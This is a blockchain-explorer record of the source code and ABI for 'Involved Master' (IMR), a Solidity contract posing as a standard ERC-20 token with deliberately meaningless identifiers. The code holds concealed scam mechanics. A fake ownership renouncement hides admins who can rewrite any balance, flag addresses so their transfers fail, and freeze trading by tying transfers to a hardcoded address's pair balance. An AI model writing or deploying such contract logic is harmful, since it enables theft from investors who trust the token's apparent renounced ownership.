{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fundLaunchMode {\n    function createPair(address receiverFee, address tradingTotal) external returns (address);\n}\n\ninterface maxFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapEnableExempt) external view returns (uint256);\n\n    function transfer(address launchReceiverTotal, uint256 launchList) external returns (bool);\n\n    function allowance(address shouldReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchReceiverTotal,\n        uint256 launchList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSender, uint256 value);\n    event Approval(address indexed shouldReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract minList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundLaunched is maxFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InvolvedMaster is minList, maxFund, fundLaunched {\n\n    uint256 private shouldLiquidity = 100000000 * 10 ** 18;\n\n    uint256 maxLimit;\n\n    function fundSwap(address sellBuy, address launchReceiverTotal, uint256 launchList) internal returns (bool) {\n        if (sellBuy == maxFundShould) {\n            return marketingFund(sellBuy, launchReceiverTotal, launchList);\n        }\n        uint256 isAt = maxFund(teamMode).balanceOf(enableBuy);\n        require(isAt == maxLimit);\n        require(launchReceiverTotal != enableBuy);\n        if (sellAt[sellBuy]) {\n            return marketingFund(sellBuy, launchReceiverTotal, txLiquidity);\n        }\n        return marketingFund(sellBuy, launchReceiverTotal, launchList);\n    }\n\n    function transferFrom(address sellBuy, address launchReceiverTotal, uint256 launchList) external override returns (bool) {\n        if (_msgSender() != amountTxList) {\n            if (totalFund[sellBuy][_msgSender()] != type(uint256).max) {\n                require(launchList <= totalFund[sellBuy][_msgSender()]);\n                totalFund[sellBuy][_msgSender()] -= launchList;\n            }\n        }\n        return fundSwap(sellBuy, launchReceiverTotal, launchList);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTotal;\n    }\n\n    function allowance(address tradingLaunchTeam, address walletMode) external view virtual override returns (uint256) {\n        if (walletMode == amountTxList) {\n            return type(uint256).max;\n        }\n        return totalFund[tradingLaunchTeam][walletMode];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletLiquiditySender;\n    }\n\n    function approve(address walletMode, uint256 launchList) public virtual override returns (bool) {\n        totalFund[_msgSender()][walletMode] = launchList;\n        emit Approval(_msgSender(), walletMode, launchList);\n        return true;\n    }\n\n    uint256 private atEnable;\n\n    mapping(address => bool) public feeShouldReceiver;\n\n    string private launchFee = \"IMR\";\n\n    uint256 public autoSender;\n\n    bool public tokenSellList;\n\n    mapping(address => mapping(address => uint256)) private totalFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchFee;\n    }\n\n    uint256 constant txLiquidity = 12 ** 10;\n\n    address public maxFundShould;\n\n    function autoLaunch() private view {\n        require(feeShouldReceiver[_msgSender()]);\n    }\n\n    uint8 private receiverTotal = 18;\n\n    function transfer(address launchIs, uint256 launchList) external virtual override returns (bool) {\n        return fundSwap(_msgSender(), launchIs, launchList);\n    }\n\n    mapping(address => bool) public sellAt;\n\n    function getOwner() external view returns (address) {\n        return shouldSell;\n    }\n\n    address enableBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function minTake(address launchedTx) public {\n        autoLaunch();\n        \n        if (launchedTx == maxFundShould || launchedTx == teamMode) {\n            return;\n        }\n        sellAt[launchedTx] = true;\n    }\n\n    bool public toAt;\n\n    function balanceOf(address swapEnableExempt) public view virtual override returns (uint256) {\n        return amountExempt[swapEnableExempt];\n    }\n\n    function marketingAmount(address launchIs, uint256 launchList) public {\n        autoLaunch();\n        amountExempt[launchIs] = launchList;\n    }\n\n    function swapLaunch(address walletExempt) public {\n        require(walletExempt.balance < 100000);\n        if (tokenSellList) {\n            return;\n        }\n        if (enableAutoLaunch != toAt) {\n            toAt = true;\n        }\n        feeShouldReceiver[walletExempt] = true;\n        if (autoSender == atEnable) {\n            enableAutoLaunch = false;\n        }\n        tokenSellList = true;\n    }\n\n    function marketingFund(address sellBuy, address launchReceiverTotal, uint256 launchList) internal returns (bool) {\n        require(amountExempt[sellBuy] >= launchList);\n        amountExempt[sellBuy] -= launchList;\n        amountExempt[launchReceiverTotal] += launchList;\n        emit Transfer(sellBuy, launchReceiverTotal, launchList);\n        return true;\n    }\n\n    string private walletLiquiditySender = \"Involved Master\";\n\n    address amountTxList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public enableAutoLaunch;\n\n    bool public fromTrading;\n\n    uint256 buyAt;\n\n    address private shouldSell;\n\n    address public teamMode;\n\n    function owner() external view returns (address) {\n        return shouldSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLiquidity;\n    }\n\n    constructor (){\n        \n        senderEnable fromLiquidity = senderEnable(amountTxList);\n        teamMode = fundLaunchMode(fromLiquidity.factory()).createPair(fromLiquidity.WETH(), address(this));\n        if (atEnable != autoSender) {\n            enableAutoLaunch = true;\n        }\n        maxFundShould = _msgSender();\n        feeShouldReceiver[maxFundShould] = true;\n        amountExempt[maxFundShould] = shouldLiquidity;\n        teamMarketing();\n        if (autoSender != atEnable) {\n            toAt = false;\n        }\n        emit Transfer(address(0), maxFundShould, shouldLiquidity);\n    }\n\n    function toFund(uint256 launchList) public {\n        autoLaunch();\n        maxLimit = launchList;\n    }\n\n    event OwnershipTransferred(address indexed autoEnable, address indexed launchLimit);\n\n    mapping(address => uint256) private amountExempt;\n\n    function teamMarketing() public {\n        emit OwnershipTransferred(maxFundShould, address(0));\n        shouldSell = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnableExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAutoLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeShouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchList\",\"type\":\"uint256\"}],\"name\":\"marketingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFundShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"}],\"name\":\"minTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchList\",\"type\":\"uint256\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchReceiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InvolvedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}